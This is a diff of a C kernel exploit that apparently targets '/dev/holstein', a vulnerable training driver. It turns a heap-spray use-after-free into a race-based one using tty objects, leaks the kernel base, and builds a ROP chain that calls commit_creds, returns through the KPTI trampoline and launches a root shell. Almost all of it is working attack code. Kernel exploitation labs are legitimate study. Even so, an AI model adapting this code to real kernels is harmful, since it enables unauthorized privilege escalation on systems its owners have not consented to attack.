@@ -1,4 +1,7 @@
+#include <ctype.h>
 #include <fcntl.h>
+#include <sched.h>
+#include <stdbool.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -6,16 +9,20 @@
 #include <sys/ioctl.h>
 #include <unistd.h>
 
+#define SPRAY_COUNT 50
+
 uintptr_t cs;
 uintptr_t rflags;
 uintptr_t rsp;
 uintptr_t ss;
 
-int tty[100];
+int tty[SPRAY_COUNT];
+uintptr_t g_buf;
+int fd0;
+int fd1;
+
 uintptr_t offset;
 #define OFFSET(addr) (addr + offset)
-
-uintptr_t g_buf;
 
 uintptr_t push_rdx_pop_rsp		= 0xffffffff8114fbea;
 uintptr_t pop_rdi_add_cl_cl_ret		= 0xffffffff812bf3d3;
@@ -24,6 +31,12 @@ uintptr_t pop_rcx_ret			= 0xffffffff8150b6d6;
 uintptr_t mov_rdi_rax_rep_movsq_ret	= 0xffffffff81638e9b;
 uintptr_t commit_creds			= 0xffffffff810723c0;
 uintptr_t kpti				= 0xffffffff81800e26;
+
+static void shell(void)
+{
+	puts("[+] get r00t!");
+	execve("/bin/sh", (char *[]){ "/bin/sh", NULL }, NULL);
+}
 
 static void save_state(void)
 {
@@ -36,63 +49,56 @@ static void save_state(void)
 		       [ss] "=r"(ss));
 }
 
-static int spray(void)
+static void uaf(void)
 {
-	int fd1 = -1;
-	int fd2 = -1;
+	uint8_t data[0x164];
 
-	memset(tty, 0, sizeof(tty));
+	while (true) {
+		fd0 = -1;
+		fd1 = -1;
 
-	for (int i = 0; i < 50; ++i) {
-		tty[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
-		if (tty[i] == -1)
+		memset(tty, 0, sizeof(tty));
+
+		fd0 = open("/dev/holstein", O_RDWR);
+		if (fd0 == -1)
 			goto err;
-	}
 
-	fd1 = open("/dev/holstein", O_RDWR);
-	if (fd1 == -1)
-		goto err;
-
-	fd2 = open("/dev/holstein", O_RDWR);
-	if (fd2 == -1)
-		goto err;
-
-	close(fd1);
-	fd1 = -1;
-
-	for (int i = 50; i < 100; ++i) {
-		tty[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
-		if (tty[i] == -1)
+		fd1 = open("/dev/holstein", O_RDWR);
+		if (fd1 == -1)
 			goto err;
-	}
 
-	return fd2;
+		sched_yield();
+		close(fd0);
 
+		for (int i = 0; i < SPRAY_COUNT; ++i)
+			tty[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
+
+		fd0 = -1;
+
+		read(fd1, data, 0x164);
+		if (*(uint32_t *)data && strncmp(&data[0x160], "ptm", 3) == 0 &&
+		    isdigit(*(uint8_t *)&data[0x163])) {
+			printf("[+] uaf success\n");
+			break;
+		} else {
+			goto err;
+		}
 err:
-	if (fd1 > 0)
-		close(fd1);
-	if (fd2 > 0)
-		close(fd2);
-	for (int i = 0; i < 100; ++i) {
-		if (tty[i] > 0) {
-			close(tty[i]);
+		if (fd0 > 0)
+			close(fd0);
+		for (int i = 0; i < SPRAY_COUNT; ++i) {
+			if (tty[i] > 0)
+				close(tty[i]);
 		}
 	}
-	perror("[-] open");
-	return -1;
 }
 
-static void shell(void)
+static void leak_offset_and_g_buf(void)
 {
-	puts("[+] get r00t!");
-	execve("/bin/sh", (char *[]){ "/bin/sh", NULL }, NULL);
-}
-
-static void leak_offset_and_g_buf(int fd, uint8_t *data)
-{
+	uint8_t data[0x40];
 	uintptr_t ptr;
 
-	read(fd, data, 0x40);
+	read(fd1, data, 0x40);
 	ptr = *(uintptr_t *)&data[0x18];
 	offset = ptr - 0xffffffff81c39c60;
 	printf("[+] offset %p\n", offset);
@@ -105,16 +111,13 @@ int main(void)
 {
 	uint8_t data[0x400] = { 0 };
 	uintptr_t *stack;
-	int fd1;
-	int fd2;
 
 	save_state();
 
-	fd1 = spray();
-	leak_offset_and_g_buf(fd1, data);
+	uaf();
+	leak_offset_and_g_buf();
 
 	read(fd1, data, 0x400);
-
 	stack = (uintptr_t *)data;
 	*stack++ = OFFSET(pop_rdi_add_cl_cl_ret);
 	*stack++ = (uintptr_t)NULL;
@@ -133,19 +136,15 @@ int main(void)
 	*stack++ = ss;
 
 	*(uintptr_t *)&data[0x3f8] = OFFSET(push_rdx_pop_rsp);
-
 	write(fd1, data, 0x400);
 
-	fd2 = spray();
-
-	read(fd2, data, 0x18);
+	uaf();
+	read(fd1, data, 0x18);
 	*(uintptr_t *)&data[0x18] = g_buf + 0x3f8 - 0x0c * 8;
-	write(fd2, data, 0x20);
+	write(fd1, data, 0x20);
 
-	for (int i = 0; i < 100; ++i)
+	for (int i = 0; i < SPRAY_COUNT; ++i)
 		ioctl(tty[i], 0, g_buf - 0x08);
 
-	close(fd1);
-	close(fd2);
 	return EXIT_SUCCESS;
 }
